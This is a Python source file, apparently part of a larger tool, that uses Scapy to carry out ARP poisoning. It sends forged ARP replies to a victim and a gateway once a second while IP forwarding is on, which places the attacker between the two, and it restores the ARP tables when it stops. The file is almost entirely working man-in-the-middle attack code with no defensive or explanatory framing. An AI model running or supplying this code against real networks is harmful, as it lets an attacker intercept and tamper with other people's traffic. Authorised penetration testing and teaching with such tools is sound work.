from scapy.all import *
import time
from utils.network_utils import get_mac_address, get_local_mac
from utils.ip_forward import enable_ip_forwarding, disable_ip_forwarding

def poison_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, interface):
    """
    Function to send ARP spoofing packets to the victim and the gateway.

    Parameters:
    victim_ip (str): IP address of the victim's machine.
    victim_mac (str): MAC address of the victim's machine.
    gateway_ip (str): IP address of the gateway.
    gateway_mac (str): MAC address of the gateway.
    attacker_mac (str): MAC address of the attacker's machine.
    interface (str): Network interface to use for sending ARP packets.

    Outputs:
    - Sends ARP spoofing packets to the victim and gateway.
    - Prints status messages indicating success or failure of the ARP poison.

    Alternative Outputs:
    - Prints an error message if packet sending fails.
    """
    try:
        victim_arp_response = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac, hwsrc=attacker_mac)
        gateway_arp_response = ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=attacker_mac)
        send(victim_arp_response, iface=interface, verbose=False)
        print("ARP poison sent: [Victim IP: %s | Spoofed as Gateway IP: %s]" % (victim_ip, gateway_ip))
        send(gateway_arp_response, iface=interface, verbose=False)
        print("ARP poison sent: [Gateway IP: %s | Spoofed as Victim IP: %s]" % (gateway_ip, victim_ip))

    except Exception as e:
        print("Failed to send ARP poison: %s" % str(e))

def restore_network(victim_ip, victim_mac, gateway_ip, gateway_mac, interface):
    """
    Function to restore the ARP tables of the victim and the gateway to their correct state.

    Parameters:
    victim_ip (str): IP address of the victim's machine.
    victim_mac (str): MAC address of the victim's machine.
    gateway_ip (str): IP address of the gateway.
    gateway_mac (str): MAC address of the gateway.
    interface (str): Network interface to use for sending ARP packets.

    Outputs:
    - Sends ARP packets to restore the ARP tables of the victim and gateway.
    - Prints status messages indicating success or failure of the ARP table restoration.

    Alternative Outputs:
    - Prints an error message if packet sending fails.
    """
    try:
        send(ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5, iface=interface, verbose=False)
        send(ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=5, iface=interface, verbose=False)
        print("ARP tables restored for [Victim IP: %s, Gateway IP: %s]" % (victim_ip, gateway_ip))
    except Exception as e:
        print("Failed to restore network: %s" % str(e))

class ArpPoisoner():
    """
    Function to run the ARP poisoning attack.
    
    Parameters:
    args (argparse.Namespace): Command-line arguments.
    
    Outputs:
    - Continuously sends ARP spoofing packets to the victim and the gateway.
    - Restores the ARP tables of the victim and the gateway when the attack is stopped.
    - Prints status messages indicating the start, stop, and success of the ARP poisoning.
    """
    args = None
    running = None
    def __init__(self, args):
        self.args = args
        self.running = False
        if not self.args.victim_mac:
            self.args.victim_mac = get_mac_address(self.args.victim_ip, interface=self.args.interface)
            if not args.victim_mac:
                print("Failed to find MAC address for victim IP: {}".format(self.args.victim_ip))
                return

        if not self.args.gateway_mac:
            self.args.gateway_mac = get_mac_address(self.args.gateway_ip, interface=self.args.interface)
            if not args.gateway_mac:
                print("Failed to find MAC address for gateway IP: {}".format(self.args.gateway_ip))
                return

        if not self.args.attacker_mac:
            self.args.attacker_mac = get_local_mac(interface=self.args.interface)
            if not self.args.attacker_mac:
                print("Failed to find MAC address for attacker interface: {}".format(self.args.interface))
                return
   
    def start(self):
        enable_ip_forwarding()
        self.running = True
        while self.running:
            poison_arp(self.args.victim_ip, self.args.victim_mac, self.args.gateway_ip, self.args.gateway_mac, self.args.attacker_mac, self.args.interface)
            time.sleep(1)

    def stop(self):
        self.running = False
        print("Stopping ARP poisoning and restoring network...")
        restore_network(self.args.victim_ip, self.args.victim_mac, self.args.gateway_ip, self.args.gateway_mac, self.args.interface)
        disable_ip_forwarding()

